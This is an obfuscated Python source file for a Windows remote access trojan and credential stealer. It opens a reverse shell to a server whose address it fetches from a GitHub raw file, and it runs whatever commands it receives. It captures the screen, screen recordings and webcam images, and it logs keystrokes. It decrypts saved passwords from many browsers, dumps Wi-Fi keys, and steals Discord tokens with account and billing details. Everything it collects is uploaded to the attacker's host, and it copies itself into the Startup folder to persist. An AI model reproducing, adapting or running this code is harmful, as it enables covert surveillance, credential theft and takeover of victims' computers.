import subprocess,socket,time,requests,os,logging,imageio,json,sqlite3,win32crypt,base64,shutil,re
from PIL import ImageGrab
from pynput.keyboard import Key, Listener
from datetime import datetime
from Cryptodome.Cipher import AES
orddtlwCQPCzehyXrLLxwm = ""
BXkLCCogwnpPOyoy = ""
TvlRsostVRRQAskJzTgzwDk = "13.02.25.0"
GjetgacSqyi = True
xNSRIiEwHTC = "!"
ljcvVcPKrwNpQxpIkc = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
BLgrqClTJuRNCi = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
hYJFIoaE = os.path.expanduser("~\\AppData\\Local\\")
fLqkyDAnNEWouSfbtkrMYwG = os.path.expanduser("~\\AppData\\Roaming\\")
WwCbKgPqebHUQgcWSQMi = ""
hgGRfAcFFQLGPzgtmGagsD = {
	'chrome':hYJFIoaE+'Google\\Chrome\\User Data','chromium':hYJFIoaE+'Chromium\\User Data','chrome-canary':hYJFIoaE+'Google\\Chrome SxS\\User Data',
	'msedge':hYJFIoaE+'Microsoft\\Edge\\User Data','msedge-canary':hYJFIoaE+'Microsoft\\Edge SxS\\User Data',
	'msedge-beta':hYJFIoaE+'Microsoft\\Edge Beta\\User Data','msedge-dev':hYJFIoaE+'Microsoft\\Edge Dev\\User Data',
	'avast':hYJFIoaE+'AVAST Software\\Browser\\User Data','amigo':hYJFIoaE+'Amigo\\User Data',
	'torch':hYJFIoaE+'Torch\\User Data','kometa':hYJFIoaE+'Kometa\\User Data','orbitum':hYJFIoaE+'Orbitum\\User Data',
	'cent-browser':hYJFIoaE+'CentBrowser\\User Data','7star':hYJFIoaE+'7Star\\7Star\\User Data',
	'sputnik':hYJFIoaE+'Sputnik\\Sputnik\\User Data','vivaldi':hYJFIoaE+'Vivaldi\\User Data',
	'epic-privacy-browser':hYJFIoaE+'Epic Privacy Browser\\User Data','uran':hYJFIoaE+'uCozMedia\\Uran\\User Data',
	'yandex':hYJFIoaE+'Yandex\\YandexBrowser\\User Data','brave':hYJFIoaE+'BraveSoftware\\Brave-Browser\\User Data',
	'iridium':hYJFIoaE+'Iridium\\User Data','coccoc':hYJFIoaE+'CocCoc\\Browser\\User Data',
	'opera':fLqkyDAnNEWouSfbtkrMYwG+'Opera Software\\Opera Stable','opera-gx':fLqkyDAnNEWouSfbtkrMYwG+'Opera Software\\Opera GX Stable'
}
def xxUhfTi(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def bNWsXilRdYa(s):
	data = s.recv(1024)
	if len(data)==0:
		return True
	xtsLwyiKJS = data.decode("utf-8").replace("\n","")
	if not xtsLwyiKJS.startswith(xNSRIiEwHTC):
		proc = subprocess.run(xtsLwyiKJS, shell=True, capture_output=True)
		NVPqbmynylUke = proc.stdout + proc.stderr
		yUhsjqMQKJByujStyjvtYUg(s, NVPqbmynylUke)
		return
	gdpUdKqVpDICQ = xtsLwyiKJS.split(" ")[0][1:]
	args = " ".join(xtsLwyiKJS.split()[1:]).split()
	if gdpUdKqVpDICQ == "download":
		UkhThPDWgmLZuCOHn(s, xtsLwyiKJS)
	elif gdpUdKqVpDICQ == "screenshot":
		jxodBXrqkTB(s)
	elif gdpUdKqVpDICQ == "basename":
		yUhsjqMQKJByujStyjvtYUg(s, os.path.basename(__file__))
	elif gdpUdKqVpDICQ == "update":
		TUPgbZETTBUKKJXqiKSwu(s)
	elif gdpUdKqVpDICQ == "wifi":
		EtrxIvmeq(s)
	elif gdpUdKqVpDICQ == "screenrecord":
		pucPbyzWvzEf(s, args)
	elif gdpUdKqVpDICQ == "browsers":
		YnBdTNrhgDPRrBYdVA(s)
	elif gdpUdKqVpDICQ == "webcam":
		webCam(s, args)
	elif gdpUdKqVpDICQ == "cd":
		try:
			os.chdir(xtsLwyiKJS[4:])
			yUhsjqMQKJByujStyjvtYUg(s,"")
		except: pass
def UkhThPDWgmLZuCOHn(s, xtsLwyiKJS):
	oOJYWSaeOpnseyfiHtpq = xtsLwyiKJS.replace(xNSRIiEwHTC+"download ","").split(",")
	NVPqbmynylUkes = ""
	for f in oOJYWSaeOpnseyfiHtpq:
		NVPqbmynylUkes += yEKCtppPOEtd(f, "api/file/", { "type":os.path.splitext(f)[1] })
	yUhsjqMQKJByujStyjvtYUg(s, NVPqbmynylUkes)
def jxodBXrqkTB(s):
	image = ImageGrab.grab(bbox=None,
		include_layered_windows=False,all_screens=True,xdisplay=None)
	AbLTYpSuVZZ = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	image.save(AbLTYpSuVZZ)
	image.close()
	NVPqbmynylUke = yEKCtppPOEtd(AbLTYpSuVZZ, "api/sscap")
	os.remove(AbLTYpSuVZZ)
	yUhsjqMQKJByujStyjvtYUg(s, NVPqbmynylUke)
def webCam(s, args):
	cameraNumber = 0
	try:
		if len(args) > 0:
			try: cameraNumber = int(args[0])
			except: pass
		camera = imageio.get_reader(f"<video{cameraNumber}>")
		imageio.imwrite(hYJFIoaE+"wc.jpg", camera.get_data(0))
		camera.close()
		r=yEKCtppPOEtd(hYJFIoaE+"wc.jpg","api/wc")
		yUhsjqMQKJByujStyjvtYUg(s, r)
	except:
		yUhsjqMQKJByujStyjvtYUg(s, "[!] 404")
def pucPbyzWvzEf(s, args):
	hdiPtKGX = 15
	if not args == []:
		try: hdiPtKGX = int(args[0])
		except: pass
	iduAPoZNphtxpYdqbSHIWCg = os.path.expanduser("~\\AppData\\Local\\")+"sr.mp4"
	zJIMrZyURCUU = []
	fps = 11
	numFrames = hdiPtKGX * fps
	for _ in range(numFrames):
		zJIMrZyURCUU.append(ImageGrab.grab(bbox=None, all_screens=True))
	imageio.mimsave(iduAPoZNphtxpYdqbSHIWCg, zJIMrZyURCUU, fps=fps, quality=8)
	yEKCtppPOEtd(iduAPoZNphtxpYdqbSHIWCg, "api/screc")
def yEKCtppPOEtd(uiXgBHkLE, LATNgVFsQesCLfz, JsXzwXPVhj=None):
	if not os.path.isfile(uiXgBHkLE):
		return "[!] 404: "+uiXgBHkLE+"\n"
	headers = {"user":os.getlogin()}
	if JsXzwXPVhj is not None:
		headers = {**headers, **JsXzwXPVhj}
	f = open(uiXgBHkLE, "rb")
	requests.post("http://"+orddtlwCQPCzehyXrLLxwm+":5555/"+LATNgVFsQesCLfz,
		files={"file":f},
		headers=headers)
	f.close()
	return "[+] 200"
def PKpPWzpLPMcDmrhFeCYz(TdJkhTPCUfTmUrdWlW, LATNgVFsQesCLfz):
	if TdJkhTPCUfTmUrdWlW.strip() == "":
		return "[!] 204"
	requests.post("http://"+orddtlwCQPCzehyXrLLxwm+":5555/"+LATNgVFsQesCLfz,
		data=TdJkhTPCUfTmUrdWlW,
		headers={"user":os.getlogin()})
	return "[+] 200"
def TUPgbZETTBUKKJXqiKSwu(s):
	h, p, v = DAdOFwSAwqDDeoXd(True)
	if (v != TvlRsostVRRQAskJzTgzwDk):
		YdFFVrm(v)
		yUhsjqMQKJByujStyjvtYUg(s, "[+] 200")
	else:
		yUhsjqMQKJByujStyjvtYUg(s, "[-] 304")
def EtrxIvmeq(s):
	try:
		profiles = [line.split(":")[1].strip().replace("\r","") for line in subprocess.check_output("netsh wlan show profiles", creationflags=0x08000000, shell=True).decode().split("\n") if "User Profile" in line]
	except:
		yUhsjqMQKJByujStyjvtYUg(s, "[!] 500")
		return
	QEzbTPQJJJ = ""
	for p in profiles:
		try: QEzbTPQJJJ+=f"    {p} - " + subprocess.check_output(f"netsh wlan show profile \"{p}\" key=clear", shell=True).decode().split("Key Content")[1].split("Cost")[0].replace(":","").strip()
		except: QEzbTPQJJJ+=f"    {p} - N/A"
	yUhsjqMQKJByujStyjvtYUg(s, QEzbTPQJJJ)
def YdFFVrm(uUIdOtPJNNZZJKirOVmrt):
	global GjetgacSqyi
	YMsuKJknRUg = os.path.basename(__file__)
	fileType = YMsuKJknRUg.split(".")[-1]
	wNhHEUCPz = YMsuKJknRUg.split(".")[0]+"."+uUIdOtPJNNZZJKirOVmrt+".pyw" if fileType.startswith("py") else ".exe"
	PqsIKgkaRlFbD = os.path.join(os.path.expanduser("~\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"), wNhHEUCPz)
	if not os.path.isfile(PqsIKgkaRlFbD):
		with open(PqsIKgkaRlFbD, "w+") as f:
			f.write(requests.get(BLgrqClTJuRNCi+"file."+ "pyw" if PqsIKgkaRlFbD.split(".")[-1].startswith("py") else "exe").text)
	else:
		GjetgacSqyi = False
def DAdOFwSAwqDDeoXd(force=False):
	global orddtlwCQPCzehyXrLLxwm, BXkLCCogwnpPOyoy
	if force or orddtlwCQPCzehyXrLLxwm == "" or BXkLCCogwnpPOyoy == "":
		data = requests.get(ljcvVcPKrwNpQxpIkc).text.replace("\n","").split(":")
		orddtlwCQPCzehyXrLLxwm = data[0].strip()
		BXkLCCogwnpPOyoy = data[1].strip()
		uUIdOtPJNNZZJKirOVmrt = data[2].strip()
	return orddtlwCQPCzehyXrLLxwm, BXkLCCogwnpPOyoy, uUIdOtPJNNZZJKirOVmrt
def hoBBxutWVW():
	try:
		wElSmWoQOqiAEmmqnDsuCPo = "settings.xpb"
		lnVZxWUIJSzUu = sorted([file for file in os.listdir(hYJFIoaE) if os.path.isfile(hYJFIoaE+"\\"+file) and file.endswith(wElSmWoQOqiAEmmqnDsuCPo.split(".")[-1])])
		if wElSmWoQOqiAEmmqnDsuCPo in lnVZxWUIJSzUu:
			lnVZxWUIJSzUu.remove(wElSmWoQOqiAEmmqnDsuCPo)
		GlxvtMejKwAIqZQgjfGm = os.path.join(hYJFIoaE,wElSmWoQOqiAEmmqnDsuCPo)
		if len(lnVZxWUIJSzUu) > 0:
			with open(GlxvtMejKwAIqZQgjfGm, "ab+") as f:
				for file in lnVZxWUIJSzUu:
					temp = os.path.join(hYJFIoaE,file)
					with open(temp,"rb") as tf:
						f.write(tf.read())
					os.remove(temp)
		yEKCtppPOEtd(GlxvtMejKwAIqZQgjfGm, "api/log")
		if os.path.isfile(GlxvtMejKwAIqZQgjfGm):
			os.remove(GlxvtMejKwAIqZQgjfGm)
	except:
		pass
def EdRSYxKSCdgfuSpqXDHcwML():
	logging.basicConfig(filename=(hYJFIoaE+str(datetime.today().strftime("%d")) + ".xpb"),
		level=logging.DEBUG,format="%(asctime)s %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
	def qgPQholIIFJdplyn(k):
		logging.info(str(k))
	k=Listener(on_press=qgPQholIIFJdplyn)
	FQaYNxXKgZNbaLLwvpyQM = [logging.getLogger(name) for name in logging.root.manager.loggerDict if not name.startswith("pynput")]
	for l in FQaYNxXKgZNbaLLwvpyQM:
		l.setLevel(logging.CRITICAL)
	k.start()
def YnBdTNrhgDPRrBYdVA(s, upload=False):
        kgwwhLABDTlylyp = "\n"
        for browser in hgGRfAcFFQLGPzgtmGagsD:
                path = hgGRfAcFFQLGPzgtmGagsD[browser]
                PPtGlxFpepjjSNLKMjTaV = None
                if not os.path.isfile(path+"\\Local State"):
                        continue
                with open(path+"\\Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        PPtGlxFpepjjSNLKMjTaV = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                profiles = [p for p in os.listdir(path) if p == "Default" or p.startswith("Profile ")]
                if browser == "opera" or browser == "opera-gx": profiles=[""]
                for profile in profiles:
                        try:shutil.copyfile(f"{path}\\{profile}\\Login Data", hYJFIoaE+"\\db.db")
                        except:continue
                        conn = sqlite3.connect(hYJFIoaE+"\\db.db")
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        kgwwhLABDTlylyp += str("*"*8+f" {browser} - {profile} "+"*"*8+"\n")
                        for _, data in enumerate(cursor.fetchall()):
                                ciphertext = data[2]
                                initVector = ciphertext[3:15]
                                encryptedPwd = ciphertext[15:-16]
                                cipher = AES.new(PPtGlxFpepjjSNLKMjTaV, AES.MODE_GCM, initVector)
                                decryptedPwd = (cipher.decrypt(encryptedPwd)).decode()
                                kgwwhLABDTlylyp += f"URL: {data[0]}\nUser: {data[1]}\nValue: {decryptedPwd}\n\n"
                        cursor.close()
                        conn.close()
                        os.remove(hYJFIoaE+"\\db.db")
        nCMjYxOnzY = []
        discordPaths = [fLqkyDAnNEWouSfbtkrMYwG+'\\discord\\Local Storage\\leveldb\\',fLqkyDAnNEWouSfbtkrMYwG+'\\discordcanary\\Local Storage\\leveldb\\',fLqkyDAnNEWouSfbtkrMYwG+'\\discordptb\\Local Storage\\leveldb\\']
        for p in [dp for dp in discordPaths if os.path.exists(dp)]:
                PPtGlxFpepjjSNLKMjTaV = ""
                with open(p.replace("Local Storage\\leveldb\\","")+"Local State", "r") as f:
                        localstate = base64.b64decode(json.load(f)["os_crypt"]["encrypted_key"])[5:]
                        PPtGlxFpepjjSNLKMjTaV = win32crypt.CryptUnprotectData(localstate,None,None,None,0)[1]
                for file in [f for f in os.listdir(p) if f.endswith(".log") or f.endswith(".ldb")]:
                        for line in [x.strip() for x in open(f"{p}\\{file}","r", errors="ignore").readlines() if x.strip()]:
                                for value in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):
                                        value = base64.b64decode(value.split('dQw4w9WgXcQ:')[1])
                                        tinitVector = value[3:15]
                                        encryptedToken = value[15:]
                                        tcipher = AES.new(PPtGlxFpepjjSNLKMjTaV, AES.MODE_GCM, tinitVector)
                                        decryptedToken = (tcipher.decrypt(encryptedToken))[:-16].decode()
                                        if decryptedToken not in nCMjYxOnzY:
                                                nCMjYxOnzY.append(decryptedToken)
        sCSUVjQvKGHMOTq = "https://discord.com/api/v9/users/@me"
        if nCMjYxOnzY: kgwwhLABDTlylyp +="*"*8+"Discord Data: "+"*"*8+"\n\n"
        for XSTOFIRbEKAfPpNRfMhd in nCMjYxOnzY:
                headers = {"Content-Type":"application/json","Authorization":XSTOFIRbEKAfPpNRfMhd,
                           "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
                j = requests.get(sCSUVjQvKGHMOTq, headers=headers).json()
                if j.get("message") != None: continue
                user = str(j.get('username')) + '#' + str(j.get("discriminator"))
                badges = ""
                flags = j['flags']
                if (flags == 1): badges += "Staff, "
                if (flags == 2): badges += "Partner, "
                if (flags == 4): badges += "Hypesquad Event, "
                if (flags == 8): badges += "Green Bughunter, "
                if (flags == 64): badges += "Hypesquad Bravery, "
                if (flags == 128): badges += "HypeSquad Brillance, "
                if (flags == 256): badges += "HypeSquad Balance, "
                if (flags == 512): badges += "Early Supporter, "
                if (flags == 16384): badges += "Gold BugHunter, "
                if (flags == 131072): badges += "Verified Bot Developer, "
                if (badges == ""): badges = "None"
                email = j.get("email")
                phone = j.get("phone") if j.get("phone") else "N/A"
                try:
                        nitro_data = requests.get(sCSUVjQvKGHMOTq+'/billing/subscriptions', headers=headers).json()
                        has_nitro = bool(len(nitro_data) > 0)
                except: pass
                try: billing = bool(len(json.loads(requests.get(sCSUVjQvKGHMOTq+"/billing/payment-sources", headers=headers).text)) > 0)
                except: pass
                kgwwhLABDTlylyp += f"\n{user}\n{'-'*len(user)}\nToken: {XSTOFIRbEKAfPpNRfMhd}\nHas Billing: {billing}\nNitro: {has_nitro}\nBadges: {badges}\nEmail: {email}\nPhone: {phone}\n\n"
        kgwwhLABDTlylyp += "\n\n"
        if not upload:
                yUhsjqMQKJByujStyjvtYUg(s, kgwwhLABDTlylyp)
        else:
                PKpPWzpLPMcDmrhFeCYz(kgwwhLABDTlylyp, "api/google")
def yUhsjqMQKJByujStyjvtYUg(clientSocket, TdJkhTPCUfTmUrdWlW):
	formattedData = b""
	if type(TdJkhTPCUfTmUrdWlW) == bytes:
		formattedData += TdJkhTPCUfTmUrdWlW
	else:
		formattedData += bytes(TdJkhTPCUfTmUrdWlW, "utf-8")
	formattedData += bytes("\n"+WwCbKgPqebHUQgcWSQMi+os.getcwd().replace("\\","/")+" >> ", "utf-8")
	clientSocket.sendall(formattedData)
def GmiJADRUUJyjLq():
	global WwCbKgPqebHUQgcWSQMi
	h, p, v = DAdOFwSAwqDDeoXd()
	try:
		hoBBxutWVW()
		YnBdTNrhgDPRrBYdVA(None,True)
		if TvlRsostVRRQAskJzTgzwDk != v:
			YdFFVrm(v)
		if GjetgacSqyi:
			EdRSYxKSCdgfuSpqXDHcwML()
		pass
	except:
		pass
	try: os.chdir(os.path.expanduser("~"))
	except: pass
	WwCbKgPqebHUQgcWSQMi = ("(old)"if TvlRsostVRRQAskJzTgzwDk!=v else "")+"["+TvlRsostVRRQAskJzTgzwDk+"] "+os.getlogin()+" - "
	while True:
		ldOIhRcbFCYK=False
		try:
			s=xxUhfTi(h, p)
			yUhsjqMQKJByujStyjvtYUg(s, "")
			while not ldOIhRcbFCYK:
				ldOIhRcbFCYK=bNWsXilRdYa(s)
			s.close()
		except:
			pass
		time.sleep(5)
GmiJADRUUJyjLq()
